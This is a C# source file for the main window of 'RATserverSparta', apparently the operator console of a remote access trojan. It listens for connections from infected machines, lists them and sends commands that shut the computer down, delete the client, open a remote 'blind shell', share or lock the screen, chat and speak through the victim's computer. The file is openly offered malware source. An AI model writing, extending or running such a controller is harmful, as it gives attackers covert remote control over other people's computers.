using RATserverSparta.Client;
using RATserverSparta.GUI.Main;
using RATserverSparta.Socket;
using RATserverSparta.Sockets;
using RATserverSparta.Tools.Chat;
using RATserverSparta.Tools.Screen;
using RATserverSparta.Tools.Shell;
using RATserverSparta.Tools.Talk;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RATserverSparta
{
    public partial class MainGUI : Form
    {
        public int ConnectedClients = 0;
        private SocketAccept SocketAcceptClassInstance;
        public MainGUI()
        {
            InitializeComponent();
            this.SocketAcceptClassInstance = new SocketAccept(this);
            ClientsList.MouseUp += MouseEvent;
            this.SocketAcceptClassInstance.OnNewConnection += NewConnection;
            this.FormClosing += Close;
        }

        private void Close(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }

        private void serverCreationStripMenuItem_Click(object sender, EventArgs e)
        {
            //If Socket Server creation returned no errors
            System.Net.Sockets.Socket Server = SocketCreate.Create(this.HostValue.Text, this);
            if (Server != null)
            {
                //Run Client Accepting at a new thread
                new Thread(new ThreadStart(() =>
                {
                    //@NOTICE: Accept() is not the default Socket function, This is my own function at the SocketServer class which calls to Socket.Accept() real function.
                    this.SocketAcceptClassInstance.Accept(Server);
                })).Start();
            }
        }

        private void NewConnection(Client.Client ClientClassInstance, System.Net.Sockets.Socket client)
        {
            Logs log = new Logs(this);
            GUI.Main.ListView Action = new GUI.Main.ListView(this);

            ClientClassInstance.CreateLogValue += log.Create;
            ClientClassInstance.ListViewAction += Action.ListViewAction;
        }        

        private void MouseEvent(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
                StripMenu.Show(Cursor.Position);

        }

        private void top_CheckedChanged(object sender, EventArgs e)
        {
            this.TopMost = top.Checked;
        }

        private dynamic SendDataAfterChecks(byte type)
        {
            if (ClientsList.SelectedItems.Count >= 1)
            {
                int count = ClientsList.SelectedItems.Count - 1;
                for (int i = count; i >= 0; i--)
                {
                    string SelectedClientString = ClientsList.SelectedItems[i].Text;
                    System.Net.Sockets.Socket SelectedClientSocket = this.SocketAcceptClassInstance.ClientSocketMap[SelectedClientString];
                    SocketSend Socket = new SocketSend(SelectedClientSocket);
                    Socket.Send(Encoding.ASCII.GetBytes("\0"), type);
                }
                return true;
            }
            else
                MessageBox.Show("no client selected");
            return false;
        }

        //Client program close
        private void disconnectToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            SendDataAfterChecks(7);
        }

        //Computer shutdown
        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            SendDataAfterChecks(14);
        }

        //chat
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (SendDataAfterChecks(2))
            {
                string SelectedClientString = ClientsList.SelectedItems[ClientsList.SelectedItems.Count - 1].Text;
                Client.Client Client = this.SocketAcceptClassInstance.ClientInstanceMap[SelectedClientString];
                System.Net.Sockets.Socket SelectedClientSocket = this.SocketAcceptClassInstance.ClientSocketMap[SelectedClientString];

                Chat chat = new Chat(Client, SelectedClientSocket);
                chat.Show();
            }
        }

        //Computer talk
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            if (SendDataAfterChecks(0))
            {
                string SelectedClientString = ClientsList.SelectedItems[ClientsList.SelectedItems.Count - 1].Text;
                System.Net.Sockets.Socket SelectedClientSocket = this.SocketAcceptClassInstance.ClientSocketMap[SelectedClientString];

                ComputerTalk ComputerSpeech = new ComputerTalk(SelectedClientSocket);
                ComputerSpeech.Show();
            }
        }
        
        //Delete app
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            SendDataAfterChecks(23);
        }

        //Blind shell
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            if (SendDataAfterChecks(0))
            {
                string SelectedClientString = ClientsList.SelectedItems[ClientsList.SelectedItems.Count - 1].Text;
                System.Net.Sockets.Socket SelectedClientSocket = this.SocketAcceptClassInstance.ClientSocketMap[SelectedClientString];

                Shell Shell = new Shell(SelectedClientSocket);
                Shell.Show();
            }
        }

        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            if (SendDataAfterChecks(8))
            {
                string SelectedClientString = ClientsList.SelectedItems[ClientsList.SelectedItems.Count - 1].Text;
                Client.Client Client = this.SocketAcceptClassInstance.ClientInstanceMap[SelectedClientString];
                System.Net.Sockets.Socket SelectedClientSocket = this.SocketAcceptClassInstance.ClientSocketMap[SelectedClientString];
                ScreenShare ScreenShare = new ScreenShare(Client, SelectedClientSocket);
                ScreenShare.Show();
            }
        }

        private void screenLockToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (SendDataAfterChecks(0))
            {
                string SelectedClientString = ClientsList.SelectedItems[ClientsList.SelectedItems.Count - 1].Text;
                System.Net.Sockets.Socket SelectedClientSocket = this.SocketAcceptClassInstance.ClientSocketMap[SelectedClientString];

                ScreenLock ScreenShare = new ScreenLock(SelectedClientSocket);
                ScreenShare.Show();
            }
        }
    }
}
